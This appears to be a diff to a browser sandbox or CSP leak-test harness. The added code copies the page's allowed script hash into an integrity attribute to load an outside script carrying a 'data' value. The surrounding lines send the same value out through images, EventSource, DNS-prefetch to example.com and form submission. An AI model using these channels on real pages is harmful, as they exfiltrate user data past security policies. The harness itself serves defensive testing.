@@ -1078,6 +1078,15 @@ try { new EventSource("${to("events")}"); } catch {}
 try { new Image().src = "${to("image")}?" + data; } catch {}
 for (const rel of ["dns-prefetch", "preconnect", "prefetch"]) try { const link = document.createElement("link"); link.rel = rel; link.href = "https://${DNS_LABEL}-" + rel + "-" + data.length + ".example.com/"; document.head.append(link); } catch {}
 try { const script = document.createElement("script"); script.src = "${to("dynamic.js")}?" + data; document.head.append(script); } catch {}
+// A script from anywhere is let in by a policy if its integrity names a hash the policy allows, so it copies ours.
+try {
+  const hash = document.querySelector('meta[http-equiv="Content-Security-Policy"]').content.match(/sha256-[^']+/)[0];
+  const script = document.createElement("script");
+  script.integrity = hash;
+  script.crossOrigin = "anonymous";
+  script.src = "${to("integrity.js")}?" + data;
+  document.head.append(script);
+} catch {}
 try { document.getElementById("f").submit(); } catch {}
 for (const id of ["blank", "top", "js"]) try { document.getElementById(id).click(); } catch {}
 // A frame made here has an origin of its own, so it can't lend this page its WebRTC, and runs nothing it's given.
